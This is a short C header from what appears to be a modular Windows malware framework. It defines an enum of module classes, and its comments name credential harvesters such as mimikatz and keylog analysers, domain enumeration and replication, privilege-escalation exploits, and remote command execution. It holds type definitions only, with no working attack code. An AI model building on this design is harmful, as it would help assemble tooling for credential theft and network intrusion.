/*
	ModuleDescriptor.h
	Definition of module descriptor and related structures
	Used by different modules
*/

#include <windows.h>



// used at MODULE_DESCRIPTOR.bModuleClass
typedef enum ENUM_MODULE_CLASSNAME
{
	MODULE_CLASS_CORE = 0,				// main core module, assumed to be only one - api for other modules, creds manager, local file storage
	MODULE_CLASS_AUTHCREDS_HARVESTER,	// auth credentials harvesters - mimikatz, rdp files, prot storage, keylog analyzers, pre-defined creds
	MODULE_CLASS_REPLICATOR,			// misc replication modules - domain enum and replicator, others
	MODULE_CLASS_EXPLOIT,				// different exploits - rights elevation, etc
	MODULE_CLASS_NETWORK,				// network communication modules - client, server, etc
	MODULE_CLASS_TASKWORKS,				// misc task executors - file execution, console command output as a result of command found in local storage

	MODULE_CLASS_OTHER = 128,			// some class-unrelated contents, especially for RES_TYPE_MODULE_RELATED or specific modules				

	MODULE_CLASS_MAXVAL = 255			// definition of a max value as a BYTE
};

